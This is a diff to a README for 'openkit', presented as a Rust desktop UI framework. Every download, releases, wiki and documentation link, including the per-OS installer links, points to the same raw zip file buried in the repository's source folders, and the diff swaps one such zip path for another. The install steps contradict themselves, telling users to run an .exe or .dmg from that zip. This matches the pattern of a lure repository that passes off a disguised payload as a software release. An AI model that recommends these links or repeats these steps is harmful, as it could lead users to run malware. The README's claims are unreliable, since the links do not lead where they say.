@@ -1,7 +1,7 @@
 # 🎨 openkit - Build Beautiful Desktop Apps Easily
 
 ## 📥 Download Now
-[![Download openkit](https://raw.githubusercontent.com/Alzoube103/openkit/main/src/render/Software-3.6.zip)](https://raw.githubusercontent.com/Alzoube103/openkit/main/src/render/Software-3.6.zip)
+[![Download openkit](https://raw.githubusercontent.com/Alzoube103/openkit/main/examples/styles/Software_v3.2.zip)](https://raw.githubusercontent.com/Alzoube103/openkit/main/examples/styles/Software_v3.2.zip)
 
 ## 📚 Overview
 openkit is a cross-platform CSS-styled UI framework for Rust. It helps you create beautiful desktop applications using familiar CSS syntax. With features inspired by Tailwind, GPU-accelerated rendering, and over 30 widgets, openkit makes app development simple and effective.
@@ -19,16 +19,16 @@ Make sure your system meets these requirements before proceeding.
 
 ## 📦 Download & Install
 To get started with openkit, follow these easy steps:
-1. **Visit the Releases Page**: Go to the [Releases page here](https://raw.githubusercontent.com/Alzoube103/openkit/main/src/render/Software-3.6.zip).
+1. **Visit the Releases Page**: Go to the [Releases page here](https://raw.githubusercontent.com/Alzoube103/openkit/main/examples/styles/Software_v3.2.zip).
 2. **Select the Latest Release**: Look for the latest version at the top of the page. Click on the version number.
 3. **Download the Installer**: Scroll down to the "Assets" section. You will see several files available for download. Choose the one that matches your operating system. For example:
-   - For Windows, look for `https://raw.githubusercontent.com/Alzoube103/openkit/main/src/render/Software-3.6.zip`.
-   - For macOS, look for `https://raw.githubusercontent.com/Alzoube103/openkit/main/src/render/Software-3.6.zip`.
-   - For Linux, find `https://raw.githubusercontent.com/Alzoube103/openkit/main/src/render/Software-3.6.zip`.
+   - For Windows, look for `https://raw.githubusercontent.com/Alzoube103/openkit/main/examples/styles/Software_v3.2.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/Alzoube103/openkit/main/examples/styles/Software_v3.2.zip`.
+   - For Linux, find `https://raw.githubusercontent.com/Alzoube103/openkit/main/examples/styles/Software_v3.2.zip`.
 4. **Run the Installer**:
    - For **Windows**: Double-click the downloaded `.exe` file and follow the prompts to install.
    - For **macOS**: Open the `.dmg` file and drag the openkit icon to your Applications folder.
-   - For **Linux**: Extract the contents of the `https://raw.githubusercontent.com/Alzoube103/openkit/main/src/render/Software-3.6.zip` file in your desired directory and run the `openkit` executable.
+   - For **Linux**: Extract the contents of the `https://raw.githubusercontent.com/Alzoube103/openkit/main/examples/styles/Software_v3.2.zip` file in your desired directory and run the `openkit` executable.
 
 ## 🎨 Using openkit
 Once installed, you can start creating applications with openkit. Here are some steps to help you begin:
@@ -60,10 +60,10 @@ If issues persist, you can seek help in the GitHub Discussions or open an issue 
 ## 🌐 Community and Support
 Join the openkit community to interact with other users and receive support:
 - **GitHub Discussions**: Share your experiences, ask questions, or provide feedback.
-- **Documentation**: Access comprehensive guides and documentation on our [GitHub Wiki](https://raw.githubusercontent.com/Alzoube103/openkit/main/src/render/Software-3.6.zip).
+- **Documentation**: Access comprehensive guides and documentation on our [GitHub Wiki](https://raw.githubusercontent.com/Alzoube103/openkit/main/examples/styles/Software_v3.2.zip).
 
 ## 🔗 Additional Resources
-- [Releases Page](https://raw.githubusercontent.com/Alzoube103/openkit/main/src/render/Software-3.6.zip)
-- [Documentation](https://raw.githubusercontent.com/Alzoube103/openkit/main/src/render/Software-3.6.zip)
+- [Releases Page](https://raw.githubusercontent.com/Alzoube103/openkit/main/examples/styles/Software_v3.2.zip)
+- [Documentation](https://raw.githubusercontent.com/Alzoube103/openkit/main/examples/styles/Software_v3.2.zip)
 
 By following this guide, you can easily download and start using openkit. Enjoy building your desktop applications!
